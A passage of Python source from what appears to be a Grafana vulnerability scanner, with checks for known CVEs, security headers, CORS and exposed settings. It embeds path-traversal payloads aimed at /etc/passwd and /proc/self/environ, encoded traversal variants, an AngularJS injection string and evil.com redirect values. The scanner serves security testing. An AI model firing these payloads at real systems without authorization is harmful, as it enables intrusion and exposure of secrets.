        """
        CVE-2021-43798: Directory Traversal - Arbitrary File Read
        
        Detection: Attempts to read /etc/passwd via plugin path traversal
        Validation: Requires multiple Unix password file indicators
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2021-43798'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} patched against directory traversal", base_url
        
        test_plugins = [
            'alertlist', 'annolist', 'barchart', 'bargauge', 'candlestick',
            'cloudwatch', 'dashboard', 'elasticsearch', 'gauge', 'geomap',
            'graph', 'graphite', 'heatmap', 'histogram', 'influxdb',
            'jaeger', 'loki', 'mssql', 'mysql', 'news',
            'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres',
            'prometheus', 'stat', 'state-timeline', 'status-history',
            'table', 'table-old', 'tempo', 'testdata', 'text',
            'timeseries', 'welcome', 'zipkin'
        ]
        
        test_files = [
            "../" * 8 + "etc/passwd",
            "../" * 8 + "etc/hostname",
            "../" * 8 + "proc/self/environ",
        ]
        
        for plugin in test_plugins:
            for traversal_path in test_files:
                try:
                    endpoint = f"/public/plugins/{plugin}/{traversal_path}"
                    test_url = urljoin(base_url, endpoint)
                    
                    response = self._safe_request('GET', test_url, allow_redirects=False)
                    
                    if response and response.status_code == 200:
                        content = response.text
                        content_lower = content.lower()
                        
                        indicators_found = 0
                        required_indicators = [
                            ('root:', 'Root user entry'),
                            ('/bin/', 'Shell path'),
                            (':x:', 'Password placeholder'),
                            ('daemon:', 'System daemon user'),
                            ('/usr/', 'User directory path'),
                            ('/sbin/', 'System binary path'),
                            ('nobody:', 'Nobody user entry'),
                            ('/etc/', 'Configuration path')
                        ]
                        
                        for indicator, description in required_indicators:
                            if indicator in content_lower:
                                indicators_found += 1
                        
                        if indicators_found >= 3 and len(content) > 100:
                            self.stats['vulnerabilities_found'] += 1
                            return True, (
                                f"Directory traversal CONFIRMED - File read via '{plugin}' plugin "
                                f"({indicators_found}/{len(required_indicators)} indicators, "
                                f"{len(content)} bytes)"
                            ), test_url
                        
                        if response.status_code == 200 and len(content) < 50:
                            continue
                            
                except Exception:
                    continue
        
        self.stats['checks_passed'] += 1
        return False, "Directory traversal blocked - file read protection active", base_url
    
    def check_cve_2025_4123(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2025-4123: "Grafana Ghost" - Path Traversal & Open Redirect XSS
        """
        self.stats['total_checks'] += 1
        
        test_vectors = [
            {
                'path': '/redirect',
                'params': {'url': 'http://external-test-domain.example.com'},
                'type': 'open_redirect'
            },
            {
                'path': '/redirect',
                'params': {'url': '//evil.com/test'},
                'type': 'open_redirect_protocol_relative'
            },
            {
                'path': '/public/plugins/test/../../../',
                'params': {},
                'type': 'path_traversal'
            },
            {
                'path': '/public/build/../../../',
                'params': {},
                'type': 'path_traversal_build'
            },
            {
                'path': '/api/frontend/settings',
                'params': {},
                'type': 'info_disclosure'
            },
            {
                'path': '/login',
                'params': {'redirect': 'http://evil.com'},
                'type': 'redirect_param'
            },
            {
                'path': '/api/snapshots',
                'params': {},
                'type': 'snapshot_access'
            }
        ]
        
        vulnerabilities = []
        
        for vector in test_vectors:
            try:
                if vector['params']:
                    query_string = '&'.join([f"{k}={v}" for k, v in vector['params'].items()])
                    test_url = urljoin(base_url, vector['path']) + '?' + query_string
                else:
                    test_url = urljoin(base_url, vector['path'])
                
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if not response:
                    continue
                
                if vector['type'] in ['open_redirect', 'open_redirect_protocol_relative']:
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if location:
                            parsed_location = urlparse(location)
                            parsed_base = urlparse(base_url)
                            
                            if vector['type'] == 'open_redirect_protocol_relative' and location.startswith('//'):
                                vulnerabilities.append(f"Protocol-relative redirect to: {location}")
                                continue
                            
                            if parsed_location.netloc and parsed_base.netloc != parsed_location.netloc:
                                vulnerabilities.append(f"Open redirect to external domain: {parsed_location.netloc}")
                
                elif vector['type'] == 'redirect_param':
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or 'http' in location:
                            vulnerabilities.append("Open redirect via login redirect parameter")
                
                elif vector['type'] in ['path_traversal', 'path_traversal_build']:
                    if response.status_code == 200:
                        content = response.text.lower()
                        path_indicators = ['root:', ':x:', '/bin/bash', 'daemon:', 'nobody:']
                        indicator_matches = sum(1 for ind in path_indicators if ind in content)
                        if indicator_matches >= 2 and len(content) > 300:
                            vulnerabilities.append(f"Possible path traversal ({indicator_matches} indicators, {len(content)} bytes)")
                
                elif vector['type'] == 'info_disclosure':
                    try:
                        data = response.json()
                        if isinstance(data, dict) and ('buildInfo' in data or 'oauth' in data):
                            if 'oauth' in data and data['oauth']:
                                vulnerabilities.append("OAuth configuration exposed via frontend settings")
                    except:
                        pass
                
                elif vector['type'] == 'snapshot_access':
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if isinstance(data, list) and len(data) > 0:
                                has_deleted_snapshots = any(
                                    s.get('deleteKey') or s.get('deleteUrl') 
                                    for s in data if isinstance(s, dict)
                                )
                                if has_deleted_snapshots:
                                    vulnerabilities.append(f"Snapshot list accessible with delete keys ({len(data)} snapshots)")
                        except:
                            pass
                            
            except Exception:
                continue
        
        if vulnerabilities:
            self.stats['vulnerabilities_found'] += 1
            return True, " | ".join(vulnerabilities), base_url + '/' + vector['path']
        
        self.stats['checks_passed'] += 1
        return False, "Redirect validation and path sanitization active", base_url
    
    def check_cve_2024_9264(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-9264: DuckDB SQL Injection
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-9264'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected by SQL injection", base_url
        
        test_endpoints = [
            '/api/ds/query',
            '/api/tsdb/query',
            '/api/query'
        ]
        
        for endpoint in test_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            try:
                test_payload = {
                    "queries": [{
                        "refId": "A",
                        "datasource": {"type": "__expr__", "uid": "__expr__"},
                        "type": "sql",
                        "expression": "SELECT 1"
                    }],
                    "from": "now-1h",
                    "to": "now"
                }
                
                response = self._safe_request('POST', test_url, json=test_payload)
                
                if not response:
                    continue
                
                if response.status_code in [401, 403]:
                    self.stats['checks_passed'] += 1
                    return False, "SQL Expressions require authentication - remote testing not possible", test_url
                elif response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict) and 'results' in data:
                            self.stats['vulnerabilities_found'] += 1
                            return True, "SQL Expressions endpoint accessible and responding", test_url
                    except:
                        pass
                    self.stats['checks_passed'] += 1
                    return False, "SQL Expressions available (exploitability requires DuckDB binary installation)", test_url
                    
            except Exception:
                continue
        
        self.stats['checks_passed'] += 1
        return False, "SQL Expressions endpoint not available or removed", base_url
    
    def check_cve_2018_15727(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2018-15727: Authentication Bypass via Cookie Forging
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2018-15727'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} has secure cookie generation", base_url
        
        auth_endpoints = [
            '/api/ldap/settings',
            '/api/ldap/status',
            '/api/oauth2/settings',
            '/api/auth/saml/settings',
            '/api/frontend/settings'
        ]
        
        detected_auth = []
        
        for endpoint in auth_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url)
                
                if not response:
                    continue
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            if 'enabled' in data and data['enabled']:
                                if 'ldap' in endpoint:
                                    detected_auth.append('LDAP')
                                elif 'oauth' in endpoint:
                                    detected_auth.append('OAuth')
                                elif 'saml' in endpoint:
                                    detected_auth.append('SAML')
                            if endpoint == '/api/frontend/settings':
                                oauth_providers = [
                                    'oauth', 'oauth2', 'google_auth', 'github_auth', 
                                    'azure_auth', 'generic_oauth', 'grafana_com_auth'
                                ]
                                for provider in oauth_providers:
                                    if provider in str(data).lower():
                                        if 'OAuth' not in detected_auth:
                                            detected_auth.append('OAuth')
                                        break
                    except:
                        pass
                        
            except Exception:
                continue
        
        if detected_auth:
            self.stats['vulnerabilities_found'] += 1
            auth_methods = ' & '.join(set(detected_auth))
            return True, f"{auth_methods} authentication enabled - vulnerable to cookie forging attack", base_url
        
        self.stats['checks_passed'] += 1
        return False, "No LDAP/OAuth/SAML configuration detected", base_url
    
    def check_cve_2021_39226(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2021-39226: Snapshot Enumeration
        """
        self.stats['total_checks'] += 1
        
        test_ids = list(range(1, 51))
        accessible_snapshots = 0
        accessible_ids = []
        last_test_url = base_url
        
        for snapshot_id in test_ids:
            endpoints = [
                f"/api/snapshots/{snapshot_id}",
                f"/dashboard/snapshot/{snapshot_id}",
                f"/api/snapshots/delete/{snapshot_id}",
                f"/api/snapshots/shared/{snapshot_id}"
            ]
            
            for endpoint in endpoints:
                try:
                    test_url = urljoin(base_url, endpoint)
                    last_test_url = test_url
                    
                    response = self._safe_request('GET', test_url)
                    
                    if not response:
                        continue
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if isinstance(data, dict):
                                if any(key in data for key in ['dashboard', 'meta', 'snapshot', 'snapshotId', 'name', 'expires']):
                                    accessible_snapshots += 1
                                    accessible_ids.append(snapshot_id)
                                    break
                        except:
                            content_lower = response.text.lower()
                            snapshot_indicators = ['snapshot', 'dashboard', 'created', 'expire']
                            indicator_count = sum(1 for ind in snapshot_indicators if ind in content_lower)
                            if indicator_count >= 2 and len(response.text) > 200:
                                accessible_snapshots += 1
                                accessible_ids.append(snapshot_id)
                                break
                                
                except Exception:
                    continue
            
            if snapshot_id % 10 == 0:
                time.sleep(0.1)
        
        if accessible_snapshots > 0:
            self.stats['vulnerabilities_found'] += 1
            return True, (
                f"Snapshot enumeration confirmed - {accessible_snapshots}/{len(test_ids)} test IDs accessible. "
                f"Sample accessible IDs: {accessible_ids[:5]}"
            ), last_test_url
        
        self.stats['checks_passed'] += 1
        return False, "Snapshots protected or enumeration blocked", base_url
    
    def check_cve_2023_50164(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2023-50164: Path Traversal via Plugin Files
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2023-50164'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        traversal_patterns = [
            "../" * 8 + "etc/passwd",
            "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//....//etc/passwd",
        ]
        
        plugins_to_test = ['alertlist', 'graph', 'table', 'prometheus', 'loki']
        
        for plugin in plugins_to_test:
            for pattern in traversal_patterns:
                try:
                    endpoint = f"/api/plugins/{plugin}/resources/{pattern}"
                    test_url = urljoin(base_url, endpoint)
                    
                    response = self._safe_request('GET', test_url, allow_redirects=False)
                    
                    if response and response.status_code == 200:
                        content = response.text.lower()
                        indicators = ['root:', ':x:', '/bin/bash', 'daemon:', 'nobody:']
                        matches = sum(1 for ind in indicators if ind in content)
                        
                        if matches >= 2 and len(response.text) > 100:
                            self.stats['vulnerabilities_found'] += 1
                            return True, (
                                f"Plugin path traversal CONFIRMED via '{plugin}' plugin "
                                f"using encoding: {pattern[:30]}... ({matches}/{len(indicators)} indicators)"
                            ), test_url
                            
                except Exception:
                    continue
        
        self.stats['checks_passed'] += 1
        return False, "Plugin path traversal protection active", base_url
    
    def check_cve_2023_1410(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2023-1410: SSRF via Data Source Proxy
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2023-1410'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        ssrf_endpoints = [
            '/api/datasources/proxy/',
            '/api/ds/proxy/',
            '/api/plugin-proxy/',
            '/api/datasources/proxy/1/',
        ]
        
        for endpoint in ssrf_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if not response:
                    continue
                
                if response.status_code == 200:
                    self.stats['vulnerabilities_found'] += 1
                    return True, (
                        f"Data source proxy endpoint accessible: {endpoint} (HTTP 200). "
                        f"Potential SSRF vector - requires authenticated datasource to exploit fully."
                    ), test_url
                elif response.status_code == 404:
                    if self.verbose:
                        self.log(f"{endpoint} returned 404 (inconclusive - may not be Grafana's DS proxy)", "INFO", 2)
                    
            except Exception:
                continue
        
        self.stats['checks_passed'] += 1
        return False, "Data source proxy protected or not exposed", base_url
    
    def check_cve_2023_2183(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2023-2183: Authentication Bypass via API
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2023-2183'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        bypass_endpoints = [
            '/api/admin/users',
            '/api/admin/ldap',
            '/api/admin/settings',
            '/api/admin/stats',
            '/api/org/users',
            '/api/org/preferences',
            '/api/teams/secrets',
            '/api/dashboards/permissions',
        ]
        
        accessible = []
        
        for endpoint in bypass_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if not response:
                    continue
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, (list, dict)) and len(str(data)) > 10:
                            accessible.append(endpoint)
                    except:
                        if len(response.text) > 50:
                            accessible.append(endpoint)
                            
            except Exception:
                continue
        
        if accessible:
            self.stats['vulnerabilities_found'] += 1
            return True, f"Potential auth bypass - accessible endpoints: {', '.join(accessible)}", base_url + accessible[0]
        
        self.stats['checks_passed'] += 1
        return False, "Authentication controls appear functional", base_url
    
    def check_cve_2024_1313(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-1313: Information Disclosure via API
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-1313'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        disclosure_endpoints = [
            '/api/frontend/settings',
            '/api/health',
            '/api/plugins',
            '/api/datasources',
            '/api/org/preferences',
            '/api/admin/settings',
        ]
        
        exposed_info = []
        
        for endpoint in disclosure_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url)
                
                if not response:
                    continue
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            sensitive_keys = [
                                'secret', 'password', 'token',
                                'credential', 'private_key', 'access_key',
                                'secret_key', 'client_secret', 'database_password',
                                'api_key', 'apikey'
                            ]
                            broad_keys = ['auth', 'key']
                            
                            def check_sensitive(obj, path=""):
                                findings = []
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        current_path = f"{path}.{key}" if path else key
                                        key_lower = key.lower()
                                        if any(s in key_lower for s in sensitive_keys):
                                            if value and isinstance(value, str) and len(str(value)) > 3:
                                                findings.append(f"{current_path}={str(value)[:20]}...")
                                        for bk in broad_keys:
                                            if re.search(r'\b' + re.escape(bk) + r'\b', key_lower):
                                                if value and isinstance(value, str) and len(str(value)) > 3 and not any(s in key_lower for s in sensitive_keys):
                                                    findings.append(f"{current_path}={str(value)[:20]}...")
                                                    break
                                        if isinstance(value, (dict, list)):
                                            findings.extend(check_sensitive(value, current_path))
                                elif isinstance(obj, list):
                                    for i, item in enumerate(obj):
                                        findings.extend(check_sensitive(item, f"{path}[{i}]"))
                                return findings
                            
                            findings = check_sensitive(data)
                            if findings:
                                exposed_info.extend(findings)
                                
                    except:
                        pass
                        
            except Exception:
                continue
        
        if exposed_info:
            self.stats['vulnerabilities_found'] += 1
            return True, f"Sensitive information disclosed: {'; '.join(exposed_info[:5])}", base_url + '/api/frontend/settings'
        
        self.stats['checks_passed'] += 1
        return False, "No significant information disclosure detected", base_url
    
    def check_cve_2024_8118(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-8118: Authentication Bypass via OAuth Flow
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-8118'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        oauth_endpoints = [
            '/api/login/oauth2',
            '/api/oauth2/test',
            '/login/oauth2',
        ]
        
        for endpoint in oauth_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if response and response.status_code not in [404, 405]:
                    self.stats['vulnerabilities_found'] += 1
                    return True, (
                        f"OAuth endpoint accessible: {endpoint} (HTTP {response.status_code}). "
                        f"Potential auth bypass vector."
                    ), test_url
                    
            except Exception:
                continue
        
        self.stats['checks_passed'] += 1
        return False, "OAuth endpoints properly restricted", base_url
    
    def check_additional_cves(self, base_url: str) -> List[Tuple[bool, str, str, str]]:
        """Check remaining CVEs with simplified detection logic"""
        results = []
        
        # CVE-2020-11110: Stored XSS
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2020-11110'):
            test_url = urljoin(base_url, "/api/snapshots")
            try:
                r = self._safe_request('GET', test_url)
                if r and r.status_code == 200:
                    try:
                        data = r.json()
                        if isinstance(data, (list, dict)) and len(str(data)) > 50:
                            results.append((True, "Snapshots API accessible - XSS vector available", test_url, "CVE-2020-11110"))
                            self.stats['vulnerabilities_found'] += 1
                        else:
                            results.append((False, "Snapshots API returned empty response", test_url, "CVE-2020-11110"))
                            self.stats['checks_passed'] += 1
                    except:
                        results.append((False, "Snapshots API returned non-JSON response", test_url, "CVE-2020-11110"))
                        self.stats['checks_passed'] += 1
                elif r and r.status_code in [401, 403]:
                    results.append((False, "Snapshots API requires authentication", test_url, "CVE-2020-11110"))
                    self.stats['checks_passed'] += 1
                else:
                    results.append((False, "Snapshots API not accessible", test_url, "CVE-2020-11110"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2020-11110"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2020-11110"))
            self.stats['checks_passed'] += 1
        
        # CVE-2021-41174: AngularJS XSS
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2021-41174'):
            payload = quote("{{constructor.constructor('return 1337')()")
            test_url = urljoin(base_url, f"/dashboard/snapshot/{payload}?orgId=1")
            try:
                r = self._safe_request('GET', test_url, allow_redirects=False)
                if r and r.status_code == 200 and "constructor" in r.text:
                    results.append((True, "AngularJS expression injection possible", test_url, "CVE-2021-41174"))
                    self.stats['vulnerabilities_found'] += 1
                elif r and r.status_code in [404, 410]:
                    results.append((False, "AngularJS sanitization active", test_url, "CVE-2021-41174"))
                    self.stats['checks_passed'] += 1
                else:
                    results.append((False, f"AngularJS test returned HTTP {r.status_code if r else 'N/A'}", test_url, "CVE-2021-41174"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2021-41174"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2021-41174"))
            self.stats['checks_passed'] += 1
        
        # CVE-2021-27358: DoS via Snapshots
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2021-27358'):
            test_url = urljoin(base_url, "/api/snapshots")
            try:
                r = self._safe_request('POST', test_url, json={"name": "test"}, allow_redirects=False)
                if r and r.status_code not in [401, 403, 404, 405]:
                    results.append((True, "Unauthenticated POST to snapshots - DoS vector", test_url, "CVE-2021-27358"))
                    self.stats['vulnerabilities_found'] += 1
                else:
                    results.append((False, f"Snapshots POST restricted (HTTP {r.status_code if r else 'N/A'})", test_url, "CVE-2021-27358"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2021-27358"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2021-27358"))
            self.stats['checks_passed'] += 1
        
        # CVE-2022-32275 & CVE-2022-32276
        for cve_id in ['CVE-2022-32275', 'CVE-2022-32276']:
            self.stats['total_checks'] += 1
            if self.is_version_vulnerable(cve_id):
                results.append((False, "Specific to v8.4.3 - requires manual validation", base_url, cve_id))
                self.stats['checks_passed'] += 1
            else:
                results.append((False, f"Version {self.grafana_version} not affected", base_url, cve_id))
                self.stats['checks_passed'] += 1
        
        return results
    
    # =================================================================
    #  CONFIGURATION ANALYSIS
    # =================================================================
    
    def check_security_headers(self, base_url: str) -> Dict:
        """Analyze HTTP security headers"""
        security_headers = {
            'Content-Security-Policy': {
                'severity': 'MEDIUM',
                'description': 'Controls resource loading policies',
                'recommended': True
            },
            'X-Content-Type-Options': {
                'severity': 'LOW',
                'description': 'Prevents MIME type sniffing',
                'recommended': 'nosniff'
            },
            'X-Frame-Options': {
                'severity': 'MEDIUM',
                'description': 'Prevents clickjacking attacks',
                'recommended': 'DENY'
            },
            'Strict-Transport-Security': {
                'severity': 'MEDIUM',
                'description': 'Enforces HTTPS connections',
                'recommended': True
            },
            'X-XSS-Protection': {
                'severity': 'LOW',
                'description': 'Cross-site scripting filter',
                'recommended': '1; mode=block'
            },
            'Referrer-Policy': {
                'severity': 'LOW',
                'description': 'Controls referrer information',
                'recommended': True
            },
            'Permissions-Policy': {
                'severity': 'LOW',
                'description': 'Controls browser features permissions',
                'recommended': True
            }
        }
        
        try:
            response = self._safe_request('GET', base_url)
            if not response:
                return {}
            
            headers = {k.lower(): v for k, v in response.headers.items()}
            results = {}
            
            for header, info in security_headers.items():
                header_lower = header.lower()
                if header_lower in headers:
                    results[header] = {
                        'present': True,
                        'value': headers[header_lower],
                        'severity': 'SAFE',
                        'message': f"Security header present: {header}: {headers[header_lower][:50]}"
                    }
                else:
                    results[header] = {
                        'present': False,
                        'severity': info['severity'],
                        'message': f"Missing security header: {header} ({info['description']})"
                    }
            
            return results
            
        except Exception:
            return {}
    
    def check_cors_misconfiguration(self, base_url: str) -> Dict:
        """Check for CORS misconfiguration"""
        try:
            parsed = urlparse(base_url)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            evil_origin = "https://evil.com"
            
            headers = {
                'Origin': evil_origin,
                'Referer': f"{evil_origin}/test"
            }
            
            response = self._safe_request('GET', base_url, headers=headers)
            
            if not response:
                return {}
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            result = {
                'checked': True,
                'reflection': False,
                'wildcard': False,
            }
            
            if acao == '*':
                result['wildcard'] = True
                result['severity'] = 'MEDIUM'
                result['message'] = 'CORS wildcard allowed - any origin can access resources'
            elif acao == evil_origin:
                result['reflection'] = True
                result['severity'] = 'MEDIUM'
                result['message'] = 'CORS reflects origin header - potential misconfiguration'
            elif acao:
                result['severity'] = 'INFO'
                result['message'] = f'CORS restricted to: {acao}'
            else:
                result['severity'] = 'SAFE'
                result['message'] = 'No CORS headers detected'
            
            if acac and acac.lower() == 'true' and (result.get('reflection') or result.get('wildcard')):
                result['severity'] = 'HIGH'
                result['message'] += ' - with credentials! Potential account takeover risk'
            
            return result
            
        except Exception:
            return {}
    
    def check_security_config(self, base_url: str) -> Dict:
        """
        Analyze security configuration and information disclosure
        
        Enhanced checks including:
        - Anonymous access
        - Metrics exposure
        - Plugin information
        - Signup availability
        - Security headers
        - CORS configuration
        - Server info disclosure
        - Debug mode detection
        - API key exposure
        - Default credentials check
        """
        config_results = {}
        
        # Anonymous Access
        try:
            url = urljoin(base_url, "/api/frontend/settings")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict):
                        anon_enabled = data.get('anonymousEnabled', False) or data.get('anonymous', {}).get('enabled', False)
                        config_results['anonymous_access'] = {
                            'enabled': anon_enabled,
                            'severity': 'MEDIUM' if anon_enabled else 'INFO',
                            'message': 'Anonymous access ENABLED - unauthenticated viewing possible' if anon_enabled else 'Anonymous access disabled',
                            'url': url
                        }
                    else:
                        config_results['anonymous_access'] = {'enabled': None, 'severity': 'INFO', 'message': 'Could not parse settings (unexpected format)', 'url': url}
                except:
                    config_results['anonymous_access'] = {'enabled': None, 'severity': 'INFO', 'message': 'Could not parse settings (non-JSON response)', 'url': url}
            elif r:
                config_results['anonymous_access'] = {'enabled': False, 'severity': 'INFO', 'message': f'Settings endpoint requires authentication (HTTP {r.status_code})', 'url': url}
        except:
            pass
        
        # Metrics Exposure
        for metrics_path in ['/metrics', '/api/prometheus/metrics', '/metrics/']:
            try:
                url = urljoin(base_url, metrics_path)
                r = self._safe_request('GET', url)
                if r and r.status_code == 200:
                    if "# TYPE" in r.text or "# HELP" in r.text or "process_cpu" in r.text:
                        config_results['metrics'] = {
                            'exposed': True,
                            'path': metrics_path,
                            'severity': 'LOW',
                            'message': f'Prometheus metrics endpoint exposed ({metrics_path}) - system information disclosure',
                            'url': url
                        }
                        break
            except:
                continue
        
        if 'metrics' not in config_results:
            config_results['metrics'] = {
                'exposed': False,
                'severity': 'INFO',
                'message': 'Metrics endpoints not exposed',
                'url': base_url
            }
        
        # Plugin Information
        try:
            url = urljoin(base_url, "/api/plugins")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    plugins = r.json()
                    if isinstance(plugins, list):
                        unsigned = [p for p in plugins if 'unsigned' in str(p.get('signature', '')).lower()]
                        self.detected_plugins = [p.get('id', 'unknown') for p in plugins if isinstance(p, dict)]
                        config_results['plugins'] = {
                            'count': len(plugins),
                            'unsigned_count': len(unsigned),
                            'severity': 'MEDIUM' if unsigned else 'INFO',
                            'message': f"{len(plugins)} plugins installed ({len(unsigned)} unsigned)" if unsigned else f"{len(plugins)} plugins installed, all signed",
                            'url': url
                        }
                except:
                    pass
        except:
            pass
        
        # Signup Availability
        try:
            url = urljoin(base_url, "/api/user/signup")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict) and data.get('enabled', False):
                        config_results['signup'] = {
                            'enabled': True,
                            'severity': 'MEDIUM',
                            'message': 'User self-signup is ENABLED - unauthorized users can register',
                            'url': url
                        }
                except:
                    pass
        except:
            pass
        
        # Security Headers
        header_results = self.check_security_headers(base_url)
        if header_results:
            missing_headers = [h for h, info in header_results.items() if not info.get('present')]
            if missing_headers:
                config_results['security_headers'] = {
                    'severity': 'LOW',
                    'missing': missing_headers,
                    'message': f"Missing security headers ({len(missing_headers)}): {', '.join(missing_headers)}"
                }
        
        # CORS Check
        cors_result = self.check_cors_misconfiguration(base_url)
        if cors_result and cors_result.get('checked'):
            config_results['cors'] = cors_result
        
        # Server Info Disclosure
        try:
            url = urljoin(base_url, "/api/health")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict):
                        # Check for excessive information in health endpoint
                        sensitive_health_keys = ['commit', 'buildstamp', 'goVersion', 'startupTime']
                        disclosed = [k for k in sensitive_health_keys if k in data]
                        if disclosed:
                            config_results['server_info_disclosure'] = {
                                'severity': 'LOW',
                                'disclosed_keys': disclosed,
                                'message': f"Build information disclosed via health endpoint: {', '.join(disclosed)}"
                            }
                except:
                    pass
        except:
            pass
        
        return config_results
    
    # =================================================================
    #  MAIN SCAN EXECUTION
    # =================================================================
    
    def scan_target(self, url: str) -> Dict:
        """
        Perform comprehensive security assessment of target
        
        Execution flow:
        1. Connectivity verification
        2. Version fingerprinting
        3. CVE vulnerability testing
        4. Configuration security analysis
        5. Results compilation and reporting
        6. Database persistence (if enabled)
        
        Returns:
            Dictionary containing scan results, vulnerabilities, and metadata
        """
        start_time = time.time()
        
        # Reset statistics for this target
        self.stats = {'total_checks': 0, 'vulnerabilities_found': 0, 'checks_passed': 0, 'errors': 0}
        self._rate_limited = False
        
        # Header
        with self._print_lock:
            print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}TARGET ASSESSMENT{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.UNDERLINE}{url}{Colors.RESET}")
            print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
        
        # Normalize URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'version': None,
            'build_info': {},
            'vulnerabilities': [],
            'configuration': {},
            'statistics': {},
            'accessible': False,
            'duration': 0
        }
        
        # Phase 1: Connectivity
        self.log("Phase 1: Connectivity Verification", "INFO")
        try:
            response = self._safe_request('GET', url, allow_redirects=True)
            if response:
                results['accessible'] = True
                self.log(f"Target reachable (HTTP {response.status_code})", "SUCCESS", 1)
            else:
                self.log("Target unreachable - check URL and network connectivity", "ERROR", 1)
                results['duration'] = time.time() - start_time
                return results
        except requests.exceptions.SSLError:
            self.log("SSL certificate validation failed - use --no-ssl-verify for self-signed certificates", "ERROR", 1)
            results['duration'] = time.time() - start_time
            return results
        except requests.exceptions.Timeout:
            self.log(f"Connection timeout ({self.timeout}s) - target may be slow or blocking requests", "ERROR", 1)
            results['duration'] = time.time() - start_time
            return results
        except requests.exceptions.ConnectionError as e:
            self.log(f"Connection refused: {str(e)}", "ERROR", 1)
            results['duration'] = time.time() - start_time
            return results
        except Exception as e:
            self.log(f"Unexpected error: {str(e)}", "ERROR", 1)
            results['duration'] = time.time() - start_time
            return results
        
        # Phase 2: Version Detection
        print()
        self.log("Phase 2: Version Fingerprinting", "INFO")
        version = self.detect_grafana_version(url)
        results['version'] = version
        results['build_info'] = self.build_info
        
        # Save target to database if enabled
